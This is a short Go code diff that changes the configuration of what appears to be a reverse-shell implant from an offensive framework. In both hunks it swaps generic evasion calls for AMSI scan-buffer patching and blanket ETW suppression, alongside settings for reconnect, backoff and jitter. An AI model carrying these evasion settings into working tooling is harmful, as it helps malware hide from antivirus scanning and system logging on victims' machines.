@@ -144,7 +144,7 @@ sh := shell.New(trans, &shell.Config{
     ReconnectWait: 3 * time.Second,
     MaxBackoff:    2 * time.Minute,
     JitterFactor:  0.3,
-    Evasion:       []evasion.Technique{amsi.Technique(), etw.Technique()},
+    Evasion:       []evasion.Technique{amsi.ScanBufferPatch(), etw.All()},
     Caller:        caller,
 })
 
@@ -216,8 +216,8 @@ func main() {
         MaxBackoff:    5 * time.Minute,
         JitterFactor:  0.25,
         Evasion: []evasion.Technique{
-            amsi.Technique(),
-            etw.Technique(),
+            amsi.ScanBufferPatch(),
+            etw.All(),
         },
         Caller: caller,
     })
